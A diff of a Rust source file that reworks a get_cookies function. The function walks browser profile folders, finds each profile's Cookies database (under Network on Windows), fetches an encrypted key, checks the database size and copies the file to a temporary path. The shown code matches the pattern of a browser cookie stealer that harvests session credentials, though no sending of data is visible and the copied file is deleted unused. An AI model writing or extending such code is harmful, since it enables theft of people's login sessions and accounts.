@@ -1,31 +1,33 @@
 use std::path::PathBuf;
 
-pub(super) async fn get_cookies(path: &mut PathBuf, profiles: &Vec<String>) {
+pub(super) async fn get_cookies(
+    path: &mut PathBuf,
+    profiles: &Vec<String>,
+    tempfile: &PathBuf,
+) -> std::io::Result<()> {
     let key = get_encrypted_key(path.clone());
 
     for profile in profiles {
         path.push(profile);
         if cfg!(target_os = "windows") {
-            path.push("/Network/Cookies");
+            path.push("/Network");
+        }
+        path.push("/Cookies");
 
-            // use std::os::windows::fs::MetadataExt;
-            // if let Ok(f) = std::fs::metadata(path.as_os_str()) {
-            //     if f.st_size() == 0 {
-            //         return;
-            //     }
-            // }
-        } else {
-            path.push("/Cookies");
+        super::check_db_size(path).await?;
 
-            use std::os::linux::fs::MetadataExt;
-            if let Ok(f) = std::fs::metadata(path.as_os_str()) {
-                if f.st_size() == 0 {
-                    return;
-                }
-            }
+        // Copy the file to the temporary folder
+        std::fs::copy(&path, tempfile).unwrap();
+
+        std::fs::remove_file(tempfile).unwrap();
+        path.pop();
+        if cfg!(target_os = "windows") {
+            path.pop();
         }
         path.pop();
     }
+
+    Ok(())
 }
 
 async fn get_encrypted_key(mut key_path: PathBuf) -> String {
